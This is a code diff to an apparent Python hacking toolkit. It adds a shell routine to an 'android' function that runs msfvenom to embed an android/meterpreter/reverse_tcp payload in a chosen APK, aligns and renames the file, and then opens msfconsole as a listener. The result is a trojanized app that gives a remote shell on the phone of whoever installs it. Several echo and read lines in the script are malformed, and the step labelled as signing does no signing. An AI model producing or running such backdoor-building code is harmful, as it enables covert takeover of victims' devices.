@@ -4574,6 +4574,29 @@ def android():
         ────────▀▀─▀▀─────────||                  |
         ==========================================|''')
 
+    time.sleep(2)
+    print(Fore.RED + "Note: This only works in Linux/Android!")
+    os.system('''
+    #binding backdoor
+    read -p "[*]Enter filepath of apk#~: " path
+    read -p "[*]Enter output payload name#~: "payload
+    read -p "[*]Enter lhost#~: "lhost
+    read -p "[*]Enter lport#~: "lport
+    echo -e "\e[31m[*]Reverse Engineering Started...;p\e[0m"
+    msfvenom -x $path -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> binded.apk
+    
+    #signing apk
+    echo -e "\e[31m
+    echo -e "[-]Signing the apk...
+    zipalign -v 4 binded.apk binded-signed.apk
+    
+    rm binded.apk && mv binded-signed.apk $payload.apk
+    echo -e "\e[34m
+    read -p "[*]Start listener(Enter) or Close (Ctrl+c) : " listener
+    msfconsole
+    
+    ''')
+
 
 # cooooooooooooooooooooooooooment
 #
